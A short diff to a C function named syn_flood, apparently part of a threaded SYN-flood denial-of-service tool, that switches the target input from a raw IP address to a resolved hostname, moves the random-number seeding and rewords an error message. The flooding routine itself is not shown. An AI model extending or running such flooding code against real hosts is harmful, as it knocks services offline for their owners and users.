@@ -18,11 +18,13 @@ int syn_flood(int argc, ...) {
     pthread_t thread_id[TH_N];
     struct sockaddr_in t_addr;
     int sock;
-    uint32_t t_ip;
+    struct in_addr t_ip;
     int t_port;
     char *inputData, *ptr;
     va_list ap;
 
+    srand((uint32_t)time(NULL));
+    
     va_start(ap, argc);
     
     switch(argc)
@@ -48,9 +50,9 @@ int syn_flood(int argc, ...) {
             break;
     }
 
-    if((t_ip = inet_addr(inputData))<0)
+    if(hostname_to_ip(inputData, &t_ip)<0)
     {
-        printf("IP address error\n");
+        printf("%s host not found, check hostname\n",inputData);
         return -1;
     }
 
@@ -59,11 +61,9 @@ int syn_flood(int argc, ...) {
         printf("Port error\n");
         return -1;
     }
-
-    srand((unsigned int)time(NULL));
     
     memset(&t_addr, 0 , sizeof(struct sockaddr_in));
-    t_addr.sin_addr.s_addr = t_ip;
+    t_addr.sin_addr = t_ip;
     t_addr.sin_port = htons((uint16_t)t_port);
     t_addr.sin_family = AF_INET;
 
